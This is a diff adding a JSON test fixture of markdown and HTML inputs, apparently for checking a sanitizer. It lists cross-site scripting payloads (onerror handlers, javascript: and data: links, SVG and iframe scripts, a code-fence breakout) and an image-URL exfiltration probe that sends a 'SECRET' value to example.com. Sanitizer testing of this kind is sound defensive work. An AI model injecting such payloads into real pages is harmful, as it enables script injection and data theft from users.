@@ -1,0 +1,13 @@
+{
+  "rawhtml": "Texte <b>gras</b> et <img src=x onerror=\"window.__xss=1\">",
+  "jslink": "[clic](javascript:window.__xss=2)",
+  "datalink": "[d](data:text/html,<script>window.__xss=3</script>)",
+  "remoteimg": "![exfil](https://example.com/leak.png?d=SECRET)",
+  "dataimg": "![ok](data:image/png;base64,iVBORw0KGgo=)",
+  "fence": "```ts\nconst s: string = \"</code><img src=x onerror=window.__xss=4>\";\n```",
+  "autolink": "voir <https://example.com/a?b=1> et https://example.org",
+  "styleattr": "<span style=\"background:url(https://example.com/x)\">s</span>",
+  "svg": "<svg><script>window.__xss=5</script></svg>",
+  "iframe": "<iframe src=\"javascript:window.__xss=6\"></iframe>",
+  "table": "| a | b |\n|---|---|\n| <i>x</i> | `y` |"
+}
